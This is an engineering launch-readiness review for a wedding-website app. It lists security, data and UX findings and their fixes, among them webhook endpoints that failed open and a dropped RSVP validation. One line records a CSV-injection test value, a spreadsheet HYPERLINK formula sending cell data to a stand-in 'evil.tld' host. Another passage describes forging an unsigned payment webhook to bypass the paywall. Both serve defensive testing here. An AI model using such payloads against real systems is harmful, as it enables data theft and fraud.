# Launch readiness — end-to-end review

Reviewed 2026-07-27 against `e0287b8`. Findings are grouped by whether they
block a real customer, and each says how it was established so nothing here has
to be taken on trust.

**Method note.** Everything marked *verified* was checked against running code or
measured. Everything marked *unverified* is a reasoned concern I could not
confirm, mostly because the authenticated screens were never opened. That
distinction matters: the one bug that actually reached users this cycle
(publishing an unedited page served an error to guests) passed typecheck, build
and review, and only surfaced when something was published and looked at.

---

## What is genuinely solid

Worth stating plainly, because the list below is all problems.

- **Tenancy isolation.** All 34 tables have RLS enabled, 32 policies. Verified
  by parsing every migration, including the `DO`-block loop that enables it for
  19 tables at once. There is a dedicated 2-org isolation test that signs in as
  a real user under RLS and proves cross-tenant reads fail.
- **Guest token handling.** Raw tokens are never stored — only
  `sha256(TOKEN_PEPPER + raw)` — and `lib/tokens.ts` throws rather than hash
  without the pepper. Guest sessions are HMAC-signed with `timingSafeEqual`.
- **RSVP correctness is well TESTED** — `scripts/test-rsvp.mjs` covers
  invite-gating, resubmission, capacity including a concurrent race, deadlines,
  archived guests and question validation. All 15 assertions pass — though two of
  them did not until 4a, a regression these tests caught the first time anyone
  ran them.
- **Idempotent webhooks.** Stripe events are deduped via `webhook_events` on a
  unique provider + event id.
- **No dead TODOs.** Zero `TODO`/`FIXME`/`HACK` across `app`, `components`, `lib`.
- **Design system.** Colour is coherent and measured: one accent per screen,
  indigo selection, ink navigation state, status with dedicated `-text` tokens,
  a categorical event ramp, a z-scale. Contrast verified in light, dark and
  admin themes.

---

## P0 — blocks launch

> **Items 1–4 are FIXED** (see the commit that added this file). All three
> endpoints were re-tested against a real `next start` production build with no
> secrets set — Stripe `503`, cron `503`, Twilio `403` — while the local
> development path still returns `200`. The descriptions are kept because the
> *pattern* is the lesson: a dev convenience that keys off "is the secret set?"
> becomes a production hole the moment config drifts.

### 1. Stripe webhook accepts unsigned payloads if the secret is unset — FIXED
`app/api/stripe/webhook/route.ts` verifies the signature **only when**
`STRIPE_WEBHOOK_SECRET` is present; otherwise it `JSON.parse`s the body and
trusts it. That is a deliberate dev convenience, but in production a missing env
var silently turns into a **paywall bypass** — anyone can POST a
`checkout.session.completed` with a `site_id` and unlock a site for free.

**Fix:** gate the unsigned branch on `process.env.NODE_ENV !== 'production'`, or
fail closed when the secret is absent. *Verified by reading the route.*

### 2. Cron endpoint is open if `CRON_SECRET` is unset — FIXED
`app/api/cron/payment-reminders/route.ts` wraps the auth check in `if (secret)`.
With the variable unset the check is skipped entirely, so anyone who knows the
path can trigger payment-reminder emails to a couple's vendors, repeatedly.

**Fix:** invert it — reject when the secret is missing. *Verified by reading
lines 15–22.*

### 3. Twilio webhook signature check is a no-op without the auth token — FIXED
Same pattern, lower blast radius: forged inbound SMS/WhatsApp messages appear in
a couple's inbox. **Fix:** fail closed in production.

### 4. `.env.example` is missing five variables the code reads — FIXED
Verified by diffing `process.env.*` across `app`, `lib`, `scripts` against the file:

| Variable | Consequence if unset |
|---|---|
| `TOKEN_PEPPER` | **App throws on the first invite link generated.** Correct behaviour, but undocumented, so a fresh deploy breaks at the worst moment |
| `NEXT_PUBLIC_BASE_DOMAIN` | Settings advertises the wrong address to couples |
| `UNSPLASH_ACCESS_KEY` | Photo search silently degrades to Openverse |
| `NEXT_PUBLIC_POSTHOG_KEY` / `_HOST` | No analytics — the launch funnel is invisible |

### 4a. RSVP answer validation is silently disabled in the live database — FIXED
Found the moment the test suites were run (they had not been, which is the whole
argument for wiring them into CI).

`0005_answer_validation.sql` added two guards to the `submit_response` RPC.
`0018_allocation_in_rpc_and_admin_stats.sql` later reimplemented that function to
add household-allocation checks and **carried over everything except those two**:

| Guard | 0005 | 0018 |
|---|---|---|
| event archived / not invited / deadline / capacity | ✓ | ✓ |
| household allocation | — | ✓ (new) |
| answer must be in the question's option list | ✓ | **dropped** |
| required questions must be answered before attending | ✓ | **dropped** |

Consequences while it was live:

- a guest could mark themselves **attending without answering a required
  question** — so a couple's meal-choice or dietary numbers could be incomplete,
  and they would find out at the venue
- an answer **outside the option list was accepted and stored**, so a
  fixed-choice question could hold arbitrary values

*How it presented: `npm run test:rsvp` failed exactly two assertions —
`attending without required answer → rejected [no error raised]` and
`answer outside the option list is rejected [no error raised]` — while all 13
others, including the concurrent capacity race, passed. That pattern is what
identified 0018 as the culprit: everything IT added still worked.*

**Fixed** by `0019_restore_answer_validation.sql`: 0018's body verbatim plus the
restored guards, so everything 0018 introduced — the event row lock, the
allocation check, the message contract — is preserved. A third loss came back
too: 0005's `coalesce(r -> 'value', 'null'::jsonb)`, without which an entry
posted with no `value` key hit the NOT NULL constraint on `rsvp_answers.value`.

*Verified: `npm run test:rsvp` now passes all 15 assertions, including the two
that were failing AND the 13 that were not — the concurrent capacity race and
the conditional-question case among them, so 0018's work survived. Tenant
isolation still passes 7/7. `db:apply` sorts filenames, so 0019 lands after 0018
and a fresh deploy ends on the restored function.*

*Confirmed live 2026-08-02: all three restored guards are present in the
deployed `submit_response` body, read back from `pg_proc` on the production
database. The gap is closed in production, not just in the repo.*

### 4b. Input bounds — FIXED, applied 2026-08-02
`0020_input_bounds.sql` adds length and shape constraints to the guest-writable
columns (misuse review M9). Applied to production after a read-only pre-flight
showed zero violating rows; all six constraints verified present, validated and
enforcing.

Note for future migrations: `db-apply.mjs` records a migration in
`schema_migrations` **only when run with no arguments**. Applying one file by
name works but leaves the tracker behind — that is how 0019 and 0020 both ended
up applied-but-unrecorded. Both have since been recorded.

### 5. No privacy policy, terms, or cookie notice — DRAFTED, still gated
No `/privacy` or `/terms` route exists, and nothing in the marketing footer links
to one. This is a paid UK product storing named guests, emails, phone numbers and
dietary requirements — i.e. personal and special-category data for people who
never signed up themselves. **This is a legal gate, not a polish item.**

`/privacy`, `/cookies` and `/terms` now exist and are linked from the footer. The
*factual* half is done and was compiled by reading the code, not by filling in a
template: the cookie table matches the two cookies actually set, the processor
table matches the integrations actually called, and the retention periods match
`lib/publish.ts`. Contrast measured in both themes; page does not scroll
horizontally at 375px.

**It is still a gate, for three reasons:**

1. `LEGAL_REVIEWED` in `lib/legal.ts` is `false`, so every page renders a visible
   "not yet reviewed by a solicitor" banner. That is deliberate — flip it only
   after a real review. It is the one-line switch that turns the banner off.
2. `LEGAL_ENTITY` is all `null`. Registered name, address, company number and ICO
   registration render as red `[to be completed]` markers on the live page. A
   privacy notice without the controller's identity is not a valid one, and most
   UK businesses processing personal data electronically must register with the
   ICO and pay the fee. **Only the founder can supply these.**
3. Two substantive questions are flagged *on the page* rather than buried here,
   because a non-lawyer cannot settle them:
   - **Controller vs processor for guest data.** The draft says the couple is
     controller and we are processor. But we set the retention period and count
     guests for our own billing — decisions the couple does not make — which
     points at joint controllership and an Art. 26 arrangement.
   - **Dietary requirements may be Art. 9 health data.** The field is free text,
     so "coeliac" and "nut allergy" go in it. If Art. 9 applies, legitimate
     interests is not available and explicit consent is likely needed at the
     point of asking — which would change the RSVP form, not just the wording.

Contact address is still a personal Hotmail account (`LEGAL_CONTACT_EMAIL`). Not
suitable for a data controller: it cannot be handed over or monitored by anyone
else, and a subject-access request landing in a personal inbox is its own
weakness. Move to a role address on the business domain.

### 5a. The homepage promises hosting we do not deliver — FIXED
`app/page.tsx` said a site "stays live for 18 months **after the wedding**" in
three places, including the pricing section. `lib/publish.ts` started an
18-month clock at **first publish**. For a couple publishing a save-the-date a
year out — the normal case — that delivered about four months after the
wedding, not eighteen. A pricing claim on the page where people decide to pay,
so a consumer-protection problem rather than a copy nit.

**The promise won; the code moved.** `lib/site-expiry.ts` now computes:

> 18 months after the **last** event, floored at 18 months from publish.

- *Last* event, not first: this is a multi-event product, and a mehndi on Friday
  with a reception on Sunday is one wedding. The clock starts when it is over.
- *Floored*: publishing thank-yous after the day still buys a full term rather
  than a site that is already expired.
- *No upper cap.* A cap sounds prudent and breaks the case it exists for — cap
  at 36 months from publish and a three-year engagement expires ON the wedding
  day. A promise with an asterisk is also worse marketing than a simple one.
  Long engagements are rare, static hosting is cheap, and admin can already
  extend or archive any individual site.
- *Recomputed on every publish*, so moving the date moves the expiry — but
  through `laterOf`, so it can only ever extend. A manual admin extension is
  never clawed back.

The three homepage lines needed no edit: they are now true as written. The terms
page was rewritten (it had documented the old rule and flagged the discrepancy).

`0022_backfill_hosting_expiry.sql` applied the rule to sites published under the
old one, since a finished wedding may never publish again. Verified: all 8
published sites now sit exactly 18 months after their last event; the one with
no dated events was left alone; nothing was shortened (`greatest`, so re-running
is harmless). Before the backfill, `riya-and-arjun` had a 2027-05-02 wedding
expiring 2028-01-04 — eight months, not eighteen.

`npm run test:misuse` covers the rule: the wedding anchor, the publish floor,
past weddings, missing and corrupt dates, and that `laterOf` never shortens.

### 6. No favicon or app icon — FIXED
No `favicon.ico`, `icon.tsx`, or `icon.png`. Every browser tab — including the
couple's published wedding site — shows the default globe.

### 7. Nothing behind auth has been visually verified — DONE 2026-08-02
The entire design overhaul was typechecked, built and colour-measured but never
opened. It has now been walked end to end.

**How.** A throwaway account (`zz-clickthrough@simvites.test`) signed in via a
magic link minted with the admin API — no password typed into any form — then
onboarding → guest list → invite matrix → editor → publish. The account, its
org and every row it created were deleted afterwards; the temporary sign-in
route was removed and the working tree verified clean.

**What held up.** Onboarding creates the site and lands on a good empty-state
dashboard. Adding a household and a guest works, and the household-level matrix
toggle correctly invited all three guests to Mehndi (`3/3`). Editor autosave
persists to `puck_data`. **The paywall holds** — Publish shows "Unlock to
publish →" and the site stayed `draft`. No console errors on any screen. The M3
CSV guard was confirmed *in the live app*: a guest named
`=HYPERLINK("https://evil.tld?d="&A1,"Click me")` exported as `"'=HYPERLINK(…)"`,
defused.

Six things it found — none blocking, the first worth fixing before launch:

**C1 — FIXED 2026-08-02.** Cause: `app/onboarding/actions.ts` hand-substituted
Hero `title` and the footer only, instead of using `applySeed` — which is the
one function that knows which props name a wedding, and which the template
previews already use. `applySeed` itself had two gaps: it never touched
`FamilyBlock`, and it only set the countdown date *when the seed had one*, so a
couple with no dates inherited the demo instant. Onboarding now calls
`applySeed` with empty date/location and no `families`, so unknown fields are
**absent rather than wrong**: side labels survive, names blank (matching the
block's own `defaultProps`), and the countdown self-hides on an empty date.
`PreviewSeed.families` keeps the marketing gallery fully dressed.

Verified three ways: all 18 seeded starters are free of demo strings
(`test:misuse`, 80 assertions); a real site created through onboarding in the
browser showed no leakage and the couple's own name; and its persisted
`puck_data` was clean.

**`sana-and-omar` — CORRECTED 2026-08-02** (data fix, no code change).

It was worse than first reported: the footer named the demo couple too, and the
same values were in the **published snapshot**, which is the only thing the
public site reads. So a visitor to that address genuinely saw "Aanya & Dev".
Confirmed by fetching the rendered page before touching anything.

Eight values corrected across the draft page and the live snapshot: Hero title
and Footer names to "Sana & Omar"; the fabricated date and Manchester location
blanked, because the site's one event has no date and no venue — absent rather
than wrong, the same principle as the C1 fix.

Done as a **new** `published_versions` row rather than a rewrite of the old
one, so publish history stays honest and the couple can still see what was
previously live. Dry-run first, applied in a transaction, and an `activity_log`
entry records that support made the change.

Afterwards, all nine sites were swept — comparing every stored `Hero.title` and
`Footer.names`, in both draft and live snapshot, against the site's own title.
No site names a couple other than its own. (`meera-and-jay` looked affected on
an earlier pass and is not: that couple really is called Meera and one parent
Raj. Matching on names needs the comparison, not a keyword.)

**C1 (high) — original report. The starter site ships another couple's family.** A brand-new site
titled "Priya & Sam" opens with a FAMILIES block reading *The Groom: Dev, Son of
Anil & Meera* / *The Bride: Aanya, Daughter of Raj & Priya*, plus a hero dated
*19 September 2026, Manchester UK* — the demo wedding, hardcoded in
`lib/templates/registry.ts:143,146,152`. The hero *title* is substituted from
the site name, so the couple sees "Priya & Sam" above someone else's parents,
and a fabricated date contradicting their own schedule ("DATE TBC"). Partial
substitution is what makes it read as a bug rather than as placeholder text, and
it is the first screen a paying customer sees.

**C2 — FIXED 2026-08-02.** The rule already existed: `importGuests` skipped a
guest already in the household, keyed on household + lowercased name, and
reported how many it skipped. `addGuest` simply had no check — so pasting a
spreadsheet deduped and typing the same name did not. Both doors now share
`lib/guests.ts`, emails are stored lowercase, and all three send paths dedupe
case-insensitively so a legacy mixed-case row cannot double-mail anyone.
`0023_guest_dedupe.sql` adds a partial unique index as the backstop and closes
the check-then-insert race. Deliberately NOT unique on email: a couple sharing
one inbox is ordinary, they just must not be mailed twice. Verified against the
live schema — exact, case- and whitespace-variant duplicates rejected; same name
in another household, a shared inbox, and re-adding after archiving all still
allowed. 91 assertions.

**C2 (medium) — original report. No duplicate detection on the guest list.** The same person added
twice — same name, email differing only in case — creates two guests with no
warning ("2 guests · 2 emails"). Emails are stored as typed
(`Chidi.Okonkwo@Example.COM`), so `sendInvitation`'s `[...new Set(emails)]`
dedupe is case-sensitive and would mail them twice. Duplicates are the single
most common guest-list data problem, and they inflate the catering numbers.

**C3 — FIXED 2026-08-02.** The field now normalises as you type, so it IS the
address: `normalizeSlugAsTyped` on change, strict `normalizeSlug` on blur, and a
hint reading "Your guests will visit <slug>.<domain>". Two deliberate departures
from the strict rule keep typing natural — a trailing dash survives (so "priya-"
is a waypoint, not something that deletes itself mid-word) and a typed space
becomes a dash rather than vanishing and gluing words together. The server still
normalises regardless.

Also fixed while there: accents were being DROPPED, not folded, so "Zoë & Arjun"
became `zo-arjun` — a letter missing from a name on printed stationery. NFD
normalisation now yields `zoe-arjun`. Verified in the running form; 109
assertions.

**C3 (medium) — original report. The web address is silently rewritten.** Typing
`Priya and Sam!! 2027` yields `priya-and-sam-2027` with no live preview and no
confirmation. Couples print this address.

**C4 — FIXED 2026-08-02.** The address now follows the couple's name as it is
typed, and stops the moment they edit it themselves; clearing the field hands
control back, so a mistaken edit is recoverable. Nobody has to invent an address
any more, and the browser validation bubble is no longer the first feedback.

**C5 — FIXED 2026-08-02.** `lib/plural.ts`, applied at the four genuine count
labels on the guest list. Written as a helper rather than a ternary per site
because there were several and the next one would have been wrong too.

*A note on how this nearly went wrong:* a regex sweep for `{expr} noun` also
matched JSX ATTRIBUTE boundaries — `households={shown} events={events}` became
`households={plural(shown, 'event')}={events}`. Five of the nine "hits" were
false positives of that kind. Reverted and done by hand. Grep-and-replace across
JSX needs the output read, not just the match count.

**C6 — FIXED 2026-08-02.** The array item summary was `i.name || 'Side'`. Once
C1 stopped seeding the demo couple's names, both rows arrived blank — so every
summary read "Side" and the two were indistinguishable without opening each in
turn. It now falls back to the side label, so a couple with nothing filled in
sees "The Groom" and "The Bride" and knows which to open. Fixing C1 is what made
this worse; the two belong together.

**Not a finding, recorded so it is not re-investigated:** an admin-generated
magic link lands on `/login?error=auth`, because `generateLink` uses the
implicit flow and puts tokens in the URL fragment, which never reaches the
server. Real users are unaffected — `createBrowserClient` uses PKCE, so their
link carries `?code=` and `/auth/callback` handles it. **Worth testing by hand:**
PKCE stores the verifier in the requesting browser, so requesting a link on a
laptop and opening it on a phone should be expected to fail. That is a common
thing for people to do.

---

## P1 — fix before you take real money

### 8. Linting does not run, anywhere — FIXED
`npm run lint` failed: `next lint` was removed in this Next version, so the
script was dead and there was no ESLint config or dependency at all — the
project had **never been linted**.

Now ESLint 9 flat config (`eslint.config.mjs`) with `eslint-config-next` 16,
wired into CI. The first run surfaced 43 problems; 7 were clean fixes and are
done. The remaining **36 are React Compiler rules** (21 components declared
inside other components, plus set-state-in-effect, purity and ref-during-render)
and are held as **budgeted warnings**: `npm run lint` fails above 36, so the
debt can shrink but never grow. Clearing it means hoisting components out of
their parents in the website editor and admin directory — a real refactor in the
least-verifiable code, not a lint tidy-up, so it is deliberately deferred rather
than silenced.

### 9. CI does not run the tests — FIXED (needs secrets to activate)
An `integration` job now runs both suites after lint/typecheck/build, on every
push and PR to main plus nightly at 07:00 UTC. It **skips with a visible notice**
when the credentials are absent — which is the case today, and correct for fork
PRs, since a green tick that ran nothing is worse than no job.

To activate, add three repo secrets pointing at a **dedicated test project**
(never production — both suites use the service-role key and create/delete
organisations and auth users):

    TEST_SUPABASE_URL
    TEST_SUPABASE_ANON_KEY            # isolation signs in as a user, so RLS is real
    TEST_SUPABASE_SERVICE_ROLE_KEY

Apply the migrations there first with `npm run db:apply`. Both suites pass as of 4a's fix, so the first
run against a correctly migrated project should be green.

### 10a. A removed block type silently blanks published sites — FIXED
Found while testing the error boundary below. Puck's `Render` **silently drops**
content entries whose `type` is not in `siteConfig` — no error, no placeholder.
A snapshot referencing `BlockThatNoLongerExists` rendered `[data-site-root]`
with 34 characters inside it: a blank wedding site, with the couple's name still
in the tab.

Published snapshots are immutable and can be months old, so the first time a
block is renamed or retired, every site using it quietly loses that section —
and if it was the only block, the whole page. Nobody is told.

**Fixed** with a tombstone renderer. `normaliseDoc()` in `lib/puck/config.tsx`
rewrites any block whose type is not in `siteConfig` — and any malformed entry —
to a `RetiredBlock`, which:

- renders **nothing** for guests (the content is genuinely gone; it cannot be
  conjured back) while the rest of the page survives intact
- renders a **deletable notice for the host** in the editor, naming the original
  block type, so the gap is discoverable and fixable
- **logs server-side**, naming the site and every offending type

All three render paths go through it — the published home page, published
sub-pages, and the editor. In the editor this is a real migration: the host's
next save persists the tombstone in place of the dead type, turning an invisible
landmine into a visible one.

*Verified against a production build with a snapshot mixing a real block, an
unknown type and a `null`: both real blocks rendered (including the one AFTER
the bad entries), no error page, nothing leaked to guests, and the server logged
`2 block(s) no longer in siteConfig — BlockThatNoLongerExists, (malformed
entry)`. The host-facing notice is unverified — it only renders in the editor,
which is behind auth.*

### 10. Wedding guests see Simvites branding on an error — FIXED
`app/error.tsx` is the root boundary, so it also catches failures on the couple's
published site — and it renders the Simvites wordmark plus "Something went
wrong." A guest opening their invitation should never see the vendor's brand.
Add an error boundary under `app/s/[siteSlug]/` in the couple's own template
voice. *Observed directly while testing the publish bug.*

### 11. No `global-error.tsx` — FIXED
An error thrown in the root layout is unhandled.

### 12. No `robots.txt` or `sitemap.xml`
The marketing site cannot be indexed properly, and — more importantly —
**published wedding sites have no crawl policy.** Many couples would consider
their site being indexed a privacy problem. Decide deliberately and state it.

### 13. Rate limiting is per-instance memory
`lib/rate-limit.ts` is honest about this in its own comment. On serverless each
warm instance keeps a separate window, so the effective limit is
`max × instances`. Fine at launch volume; move to Upstash before any marketing push.

### 14. The `newbie@occasio.test` review account still exists
Not created by any seed script, so it must be recreated by hand as
`newbie@simvites.test`. Every `Occasio` string in the codebase is gone; this one
lives only in the database.

---

## P2 — weak or unproven, not blocking

- **Assistant and Messaging are unproven.** Both degrade gracefully when
  unconfigured (verified — good empty states), but neither has been exercised
  with real keys. They are the two features most likely to disappoint.
- **Accessibility is only half-checked.** Colour contrast is measured and passing
  throughout. Keyboard order, focus management in the editor's floating panels,
  and screen-reader labelling are **unaudited**. The preview shell traps focus
  correctly; nothing else has been checked.
- **Responsive behaviour is unverified** beyond the marketing page. The invite
  matrix is a wide fixed grid and is the most likely thing to break on a phone.
- **No monitoring.** No Sentry or equivalent, so a production error surfaces only
  if a couple reports it.
- **No backup/restore story** for a couple's data. `published_versions` gives
  site-content history, but guests, RSVPs and budget have no user-facing undo.
- **`ComingSoon` in `components/app/ui.tsx` is dead code** — zero usages.
- **Two design judgement calls** left deliberately open: dark-mode danger sits
  0.120 OKLab from the accent (the measured ceiling for a legible red on navy,
  vs 0.169 in light), and micro-labels use 12px/11px rather than a single size.

---

## Suggested order

1. ~~Three webhook/cron fail-closed fixes (#1–3)~~ **done**
2. ~~`.env.example` (#4)~~ **done** — a deploy checklist is still worth writing
3. ~~Legal pages (#5)~~ **drafted** — now blocked on things only you can do:
   company details for `LEGAL_ENTITY`, a solicitor to settle the two flagged
   questions, then flip `LEGAL_REVIEWED`
4. ~~The 18-month hosting claim (#5a)~~ **done** — the code now delivers what the
   pricing page promises, and existing sites were backfilled
5. ~~Click-through of guest list + editor (#7)~~ **done** — found C1–C6; **C1
   (starter site shows the demo couple's family) is worth fixing before launch**
6. ~~Favicon (#6), guest error page (#10), block tombstone (#10a)~~ **done** — **robots decision (#12)** remains
7. ~~Fix lint, add it to CI (#8); wire the test suites into CI (#9)~~ **done** —
   the integration job needs `TEST_SUPABASE_*` repo secrets to actually run
8. Everything in P2 as capacity allows
